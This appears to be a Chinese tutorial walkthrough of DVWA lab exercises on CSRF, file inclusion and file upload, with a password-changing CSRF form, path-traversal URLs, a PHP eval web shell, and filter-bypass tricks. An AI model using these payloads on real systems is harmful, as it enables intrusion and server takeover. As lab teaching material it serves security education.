+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104247968.png" alt="1570104247968"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104381352.png" alt="1570104381352"></p>
+<p><strong>抓包</strong>：开启Tamper Data——三步操作——截获数据包</p>
+<p><strong>分析：</strong>打开数据包——修改数据包——登录验证</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104713746.png" alt="1570104713746"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104748768.png" alt="1570104748768"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104789531.png" alt="1570104789531"></p>
+<p><strong>攻击者原始思路：</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104837876.png" alt="1570104837876"></p>
+<p><strong>构造HTML</strong>：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570104864794.png" alt="1570104864794"></p>
+<p><strong>构造链接</strong>——诱骗受害者点击——<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570110388683.png" alt="1570110388683"></p>
+<p>上面的操作都是建立在安全等级是Low Level上面的</p>
+<p>②使用安全等级是中等</p>
+<p>将low数据包和medium数据包进行比较</p>
+<p>对比</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570110574870.png" alt="1570110574870"></p>
+<p><strong>尝试</strong>：截包——改referer发送——查看结果</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570110776775.png" alt="1570110776775"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570110800854.png" alt="1570110800854"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570110811950.png" alt="1570110811950"></p>
+<p><strong>修改过程中的思考：</strong></p>
+<p><code>referer</code>：<code>http://127.0.0.1/DVWA-1.9/vulnerabilities/csrf/</code>   -——&gt;    ok</p>
+<p><code>referer</code>：<code>http://127.0.0.1/</code>    ——&gt;ok</p>
+<p><code>referer</code>：<code>127.0.0.1</code>     ——&gt;ok</p>
+<p>得出结论：<strong>referer只要包含host就能绕过限制</strong></p>
+<p><strong>验证</strong>：referer修改为host——修改成功</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570111305698.png" alt="1570111305698"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570111317765.png" alt="1570111317765"></p>
+<p><strong>攻击者思路</strong>：构造HTML——&gt;构造链接——&gt;诱骗受害者点击——&gt;受害者点击——&gt;攻击者登录</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570111564798.png" alt="1570111564798"></p>
+<p>这是第二步需要完成的</p>
+<p>实战演示：</p>
+<p>在xampp的根目录下建立一个<code>csrf.html</code>文件（apache的启动根目录是xampp/htdocs）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/dvwa-master/vulnerabilities/csrf/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Click Me&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在浏览器输入框输入：<code>127.0.0.1/csrf.html</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570114591225.png" alt="1570114591225"></p>
+<p>查看页面的源代码</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570114683166.png" alt="1570114683166"></p>
+<p>点击按钮后，跳转到DVWA下的csrf页面</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570114638198.png" alt="1570114638198"></p>
+<p>注意：该页面的路径要和<code>csrf.html</code>的路径是一致的</p>
+<p>接下来我们使用Tamper Data进行改包，将浏览器后退一下，回到<code>csrf.htm</code>那个页面，然后start Tamper</p>
+<p>点击“提交查询”，会有一个弹窗，</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570115942454.png" alt="1570115942454"></p>
+<p>点击<code>ok</code>后，</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116268578.png" alt="1570116268578"></p>
+<p>修改完成后，点击<code>ok</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116306293.png" alt="1570116306293"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116115630.png" alt="1570116115630"></p>
+<p>中等安全等级</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116867444.png" alt="1570116867444"></p>
+<p>联想上一次的破解</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116886525.png" alt="1570116886525"></p>
+<p>如何解决呢？</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570116905515.png" alt="1570116905515"></p>
+<p><code>CSRF Token：</code>我们称这种类型的随机参数为csrf token，它保证了攻击者无法猜测到所有参数</p>
+<p>为什么暴力破解可以突破csrf token？</p>
+<p><strong>解释：</strong>因为构造HTTP请求的人不一样，暴力破解的<strong>攻击者是当前用户</strong>，受害者是其他用户；CSRF的攻击者是其他用户，<strong>受害者是当前用户</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570117140675.png" alt="1570117140675"></p>
+<p><strong>修复：</strong></p>
+<ol>
+<li>校验referer（Medium等级）</li>
+<li>随即Token（High等级）</li>
+<li>验证码</li>
+</ol>
+<h2 id="5-文件包含"><a href="#5-文件包含" class="headerlink" title="5 文件包含"></a>5 文件包含</h2><p>指：一种代码处理方法，函数如include、require等，<strong>参数是文件名</strong></p>
+<p><strong>文件包含漏洞：</strong>文件名参数用户可控且过滤不严，<strong>被攻击者偷梁换柱</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570417499370.png" alt="1570417499370"></p>
+<h3 id="Low等级操作"><a href="#Low等级操作" class="headerlink" title="Low等级操作"></a>Low等级操作</h3><p>工具：firefox、hackbar、DVWA</p>
+<p>进行文件1、2、3的操作</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570418812619.png" alt="1570418812619"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570418836117.png" alt="1570418836117"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570418851900.png" alt="1570418851900"></p>
+<p>三个文件，只有参数中的<strong>page</strong>发生了变化</p>
+<p><strong>尝试</strong>：将<code>test.php</code>给page——报错</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570418963883.png" alt="1570418963883"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570418985713.png" alt="1570418985713"></p>
+<p>大致的意思我们找不到这个文件，但是我们有一个很大的收获，那就是<strong>暴露了web的绝对路径</strong></p>
+<p><strong>思考</strong>：<code>http://localhost/dvwa-master/vulnerabilities/fi/?page=xxx.php</code>中变化的只是<strong>page=xxx.php</strong>，说明php文件都是在一个路径下的，变的只是文件名而已。</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570419291969.png" alt="1570419291969"></p>
+<p>通过测试我们找到了文件的物理路径了，即<code>include(&quot;F:\Tools\phpDevelop\XMAPP\htdocs\DVWA-master\vulnerabilities\fi\xxx.php &quot;)</code>,所以<strong>xxx.php</strong>是我们<strong>可控</strong>字段，之前的都是<strong>固定</strong>字段。</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570419484433.png" alt="1570419484433"></p>
+<h4 id="攻击——本地文件读取"><a href="#攻击——本地文件读取" class="headerlink" title="攻击——本地文件读取"></a><strong>攻击——本地文件读取</strong></h4><p><strong>读取</strong>：<code>F:\Tools\phpDevelop\XMAPP\htdocs\DVWA-master\php.ini</code>的内容</p>
+<p><code>include(&quot;F:\Tools\phpDevelop\XMAPP\htdocs\DVWA-master\php.ini&quot;)</code></p>
+<p>==include(“F:\Tools\phpDevelop\XMAPP\htdocs\DVWA-master\vulnerabilities\fi\==…/…/php.ini”)</p>
+<p>黄色为固定字段，后面的是可控字段</p>
+<p>验证：访问原始内容——文件包含内容——成功读取</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570420011680.png" alt="1570420011680"></p>
+<p>URL：<code>http://localhost/dvwa-master/vulnerabilities/fi/?page=../../php.ini</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570425105406.png" alt="1570425105406"></p>
+<h4 id="攻击——本地文件执行"><a href="#攻击——本地文件执行" class="headerlink" title="攻击——本地文件执行"></a><strong>攻击——本地文件执行</strong></h4><p>读取其他目录的PHP脚本会怎么样？</p>
+<p>显示内容还是执行PHP代码？</p>
+<p><strong>验证</strong>：原始内容——文件包含内容——成功执行</p>
+<p>在dvwa根目录下有一个<code>phpinfo.php</code>文件，可以显示服务端相关的配置信息</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570425586418.png" alt="1570425586418"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570425607769.png" alt="1570425607769"></p>
+<p><code>http://localhost/dvwa-master/vulnerabilities/fi/?page=../../phpinfo.php</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570425814698.png" alt="1570425814698"></p>
+<p>显示的内容是一样的</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570425924848.png" alt="1570425924848"></p>
+<h4 id="攻击——远程文件执行"><a href="#攻击——远程文件执行" class="headerlink" title="攻击——远程文件执行"></a><strong>攻击——远程文件执行</strong></h4><p>这个文件可以在任何地方？</p>
+<p>只要有PHP代码的文件都会执行</p>
+<p><strong>验证</strong>：原始内容——文件包含内容——成功执行</p>
+<p>与dvwa在同一个目录网站下的</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570426248681.png" alt="1570426248681"></p>
+<p>URL：<code>http://localhost/dvwa-master/vulnerabilities/fi/?page=http://127.0.0.1/test.php</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570426399482.png" alt="1570426399482"></p>
+<p><strong>问题：</strong></p>
+<p>远程攻击执行不是在攻击者的 web’服务器上执行，因为并没有啥意义，我们期待在受害者的web上执行，所以<code>phpinfo.txt</code>才是正解</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570427183009.png" alt="1570427183009"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570427192412.png" alt="1570427192412"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570427206436.png" alt="1570427206436"></p>
+<h4 id="攻击者思路"><a href="#攻击者思路" class="headerlink" title="攻击者思路"></a>攻击者思路</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570427343490.png" alt="1570427343490"></p>
+<p>上面的操作都是在Low等级下完成的，下面进行Medium等级下的操作</p>
+<h3 id="Medium等级操作"><a href="#Medium等级操作" class="headerlink" title="Medium等级操作"></a>Medium等级操作</h3><h4 id="本地文件读取"><a href="#本地文件读取" class="headerlink" title="本地文件读取"></a>本地文件读取</h4><p>Low方法失效，<strong>过滤了某些字符</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570428587230.png" alt="1570428587230"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570428644583.png" alt="1570428644583"></p>
+<p>中级是将<code>../</code>过滤了，即上面的截图前三个都可以用，最后一个不可以用，此时我们使用<strong>反斜杠</strong><code>..\</code></p>
+<p>验证：</p>
+<p>URL：<code>http://localhost/dvwa-master/vulnerabilities/fi/ ?page=..\..\php.ini</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570428837625.png" alt="1570428837625"></p>
+<h4 id="远程文件执行"><a href="#远程文件执行" class="headerlink" title="远程文件执行"></a>远程文件执行</h4><p>Low方法失效，<strong>过滤了某些字符</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570428987783.png" alt="1570428987783"></p>
+<p>通过验证发现，过滤的字符串是<code>http://</code>这个完整的字符串<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570429245971.png" alt="1570429245971"></p>
+<p>前三个不会被过滤掉的，只过滤最后一个</p>
+<p><strong>解决方法：</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570429292776.png" alt="1570429292776"></p>
+<h3 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h3><p>Low和Medium都失败</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570429758076.png" alt="1570429758076"></p>
+<p>通过不断探索，发现他过滤了某些字符串,<code>file*</code></p>
+<h4 id="攻击——本地文件读取-1"><a href="#攻击——本地文件读取-1" class="headerlink" title="攻击——本地文件读取"></a>攻击——本地文件读取</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570429871350.png" alt="1570429871350"></p>
+<p><strong>方法：</strong></p>
+<p><code>file://</code>——file协议，文件传输协议，访问<strong>本地</strong>计算机中的文件</p>
+<p>操作：在file://后面添加上<strong>物理地址</strong>即可</p>
+<p>URL：<code>http://localhost/dvwa-master/vulnerabilities/fi/ ?page=file://F:/Tools/phpDevelop/XMAPP/htdocs/DVWA-master/phpinfo.php</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570430379303.png" alt="1570430379303"></p>
+<p>通过测试file://F:/Tools/phpDevelop/XMAPP/htdocs/DVWA-master/phpinfo.php也是可以的</p>
+<p>当然我们也可以读取<strong>系统的文件</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570430582610.png" alt="1570430582610"></p>
+<h4 id="攻击——远程文件执行-1"><a href="#攻击——远程文件执行-1" class="headerlink" title="攻击——远程文件执行"></a>攻击——远程文件执行</h4><p>==由于必须file开头，无法远程文件执行==</p>
+<p>需要结合文件上传漏洞，然后进行本地文件执行</p>
+<h4 id="攻击者思路-1"><a href="#攻击者思路-1" class="headerlink" title="攻击者思路"></a>攻击者思路</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570431220753.png" alt="1570431220753"></p>
+<h2 id="6文件上传"><a href="#6文件上传" class="headerlink" title="6文件上传"></a>6文件上传</h2><p>举例</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570431431587.png" alt="1570431431587"></p>
+<p>web中常见功能，将本地文件上传到<strong>服务器</strong>上</p>
+<p>web允许用户上传恶意代码文件，并在<strong>服务器</strong>上运行</p>
+<p>类似代码</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570431699122.png" alt="1570431699122"></p>
+<p>工具：firefox、DVWA、hackbar、proxy switcher、owasp zap</p>
+<p>对于陌生的页面，一个字：试，使劲的试</p>
+<h3 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h3><p>正常操作：xxx.png——选择——上传</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570433159021.png" alt="1570433159021"></p>
+<p>现在:研究下路径，将其与浏览器的地址与其拼接</p>
+<p><code>http://localhost/dvwa-master/vulnerabilities/upload/../../hackable/uploads/640.PNG </code></p>
+<p>用<code>../与../</code>与前面的路径进行消除操作，变为了</p>
+<p>==<code>http://localhost/dvwa-master/hackable/uploads/640.PNG </code>，==而事实也确实是这样的</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434108789.png" alt="1570434108789"></p>
+<p><strong>访问</strong>：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434200024.png" alt="1570434200024"></p>
+<p>接下来进行非正常的操作</p>
+<p>尝试：phpinfo.php——上传——成功执行</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434459629.png" alt="1570434459629"></p>
+<p>成功说明存在漏洞</p>
+<p><strong>攻击</strong>：cmd.php——上传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434663812.png" alt="1570434663812"></p>
+<p>上传成功</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434690343.png" alt="1570434690343"></p>
+<p>URL：<code>http://localhost/dvwa-master/hackable/uploads/cmd.php?cmd=phpinfo();</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570434753992.png" alt="1570434753992"></p>
+<p>我们接下来使用<strong>系统命令</strong></p>
+<p><strong>①</strong>使用php中<code>system</code>函数，可以调用cmd中的命令，使用下面的url，可以知道<strong>当前文件的物理路径</strong></p>
+<p>URL：<code>http://localhost/dvwa-master/hackable/uploads/cmd.php?cmd=system(&#39;dir&#39;);</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570435749048.png" alt="1570435749048"></p>
+<p><strong>②</strong>查看文件：</p>
+<p>URL：<code>http://localhost/dvwa-master/hackable/uploads/cmd.php?cmd=system(&#39;type F:\Tools\phpDevelop\XMAPP\htdocs\DVWA-master\robots.txt &#39;);</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570436066256.png" alt="1570436066256"></p>
+<p>注意有时候会<strong>转义</strong><code>\</code>，所以会写成两个反斜杠<code>\\</code>,即上面的URL改写成</p>
+<p><code>http://localhost/dvwa-master/hackable/uploads/cmd.php?cmd=system(&#39;type F:\\Tools\\phpDevelop\\XMAPP\\htdocs\\DVWA-master\\robots.txt &#39;);</code></p>
+<h3 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570436347021.png" alt="1570436347021"></p>
+<p>不允许上传，low方法失败</p>
+<p>How to 解决呢？</p>
+<p><strong>思考：转包看一看</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570436432746.png" alt="1570436432746"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570436477975.png" alt="1570436477975"></p>
+<p><strong>对比法</strong>：将成功和失败的包进行对比</p>
+<p>成功包</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437589260.png" alt="1570437589260"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437679373.png" alt="1570437679373"></p>
+<p>失败包</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437718296.png" alt="1570437718296"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437769717.png" alt="1570437769717"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437873496.png" alt="1570437873496"></p>
+<p>我们来分析下</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570437947967.png" alt="1570437947967"></p>
+<p>成功的内容</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570438177190.png" alt="1570438177190"></p>
+<p>失败的内容</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570438345506.png" alt="1570438345506"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570438433491.png" alt="1570438433491"></p>
+<p>不断尝试——修改重新发送——确认文件类型</p>
+<p><strong>攻击：</strong>上传php文件，抓包后，修改文件类型为<code>image/jpeg(png)</code>,然后点击发送</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570439067716.png" alt="1570439067716"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570439180237.png" alt="1570439180237"></p>
+<h3 id="High等级-1"><a href="#High等级-1" class="headerlink" title="High等级"></a>High等级</h3><p>低和中级都是失败的</p>
+<p>方法还是一样的，通过抓包对比</p>
+<p>我们发现最终是<code>文件后缀和文件内容</code>被限制了</p>
+<p>尝试：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570440694637.png" alt="1570440694637"></p>
+<p>==制作“内涵图”==</p>
+<p><code>1.jpg</code></p>
+<p><code>1.txt</code>:写入我们PHP代码</p>
+<p><code>2.jpg</code>：使用cmd将其合并到2.jpg中，看起来不会有什么变化</p>
